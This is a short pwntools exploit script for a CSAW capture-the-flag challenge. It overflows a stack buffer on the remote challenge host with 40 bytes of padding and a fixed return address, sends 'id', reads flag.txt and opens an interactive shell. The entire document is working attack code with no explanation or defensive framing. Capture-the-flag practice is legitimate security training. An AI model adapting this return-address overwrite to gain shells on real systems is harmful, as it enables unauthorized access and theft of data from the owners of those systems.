#!/usr/bin/python

from pwn import *

HOST = 'pwn.chal.csaw.io'
PORT = '9001'

log.info('Crafting Exploit')
padding = 'A' * 40 # Creates a padding of 40 bytes
payload = p64(0x4005b6) # Sets value to overwrite return address
exploit = padding + payload
log.info('Exploit Crafted')

p = log.progress('Exploiting target {}:{}'.format(HOST, PORT))
r = remote(HOST, PORT) # Connecting to host
print r.recv()
p.status('Sending Exploit')
r.sendline(exploit) # Sending Exploit
r.sendline('id') # Get ID of user
check = r.recv()
p.success('PWNED!')
r.sendline('cat flag.txt')
r.interactive() # Get Shell!
